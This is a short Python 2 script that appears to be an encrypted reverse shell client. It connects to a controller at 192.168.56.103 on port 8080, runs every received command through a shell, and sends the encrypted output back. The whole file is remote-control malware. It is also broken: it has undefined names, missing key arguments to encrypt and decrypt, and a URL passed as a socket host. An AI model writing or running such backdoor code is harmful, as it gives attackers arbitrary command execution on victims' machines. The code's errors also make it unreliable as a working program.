import socket, os, subprocess
from Crypto.PublicKey import RSA

def keyGen():
	newKey = RSA.generate(4096)
	publicKey = newKey.publickey().export("PEM")
	privateKey = newKey.exportKey("PEM")
	print "This is the publicKey", publicKey
	print "\n\r\n\r"
	print  "This is the privateKey", privateKey
	return publickey, privateKey

def encrypt(msg, publicKey):
	encrypt = RSA.importKey(publicKey)
	global encryptedData 
	encryptedData = encrypt.encrypt(msg, 0)
	return encryptedData[0]

def decrypt(cipher, privateKey):
	decrypt = RSA.importKey(privateKey)
	decryptedData = decrypt.decrypt(cipher)
	return decryptedData


def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("http://192.168.56.103", 8080))

	while True:
		command = decrypt(s.recv(512))

		print "Received.." + command

		if 'terminate' in command:
			s.close()
			break

		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			result = CMD.stdout.read()

			if len(result)> 512:
				for i in range(0, len(result), 512):
					chunk = result[0+i:512+i]
					s.send(encrypt(chunk))

			else:
				s.send(encrypt(result))
def main():
	connect()
main()